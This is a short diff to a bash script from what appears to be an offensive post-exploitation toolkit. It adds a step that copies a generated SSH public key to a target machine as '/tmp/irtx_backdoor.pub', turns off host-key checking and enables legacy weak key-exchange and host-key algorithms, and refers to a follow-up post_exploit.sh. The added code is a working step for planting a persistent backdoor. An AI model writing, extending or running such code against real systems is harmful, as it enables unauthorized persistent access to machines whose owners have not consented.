@@ -112,7 +112,28 @@ if [ ! -f "$KEY_PATH" ]; then
     echo -e "    ${CYAN}Private key : $KEY_PATH${RESET}"
     echo -e "    ${CYAN}Public key  : $KEY_PATH.pub${RESET}"
 fi
+echo ""
 
+# =======================================================
+# STEP 2.5 — COPY PUBLIC KEY TO TARGET
+# =======================================================
+echo -e "${MAGENTA}[>] Step 2.5: Copying public key to target ...${RESET}"
+echo ""
+echo -e "${YELLOW}[!] You will be prompted for the target SSH password.${RESET}"
+echo ""
+
+scp -P "$SSH_PORT" \
+  -o StrictHostKeyChecking=no \
+  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
+  -o HostKeyAlgorithms=+ssh-rsa \
+  "$KEY_PATH.pub" \
+  "$TARGET_USER@$TARGET_IP:/tmp/irtx_backdoor.pub"
+
+if [[ $? -eq 0 ]]; then
+  echo -e "${GREEN}[+] Public key copied to $TARGET_IP:/tmp/irtx_backdoor.pub${RESET}"
+else
+  echo -e "${RED}[!] SCP failed — post_exploit.sh will need the key pasted manually.${RESET}"
+fi
 echo ""
 
 # =======================================================
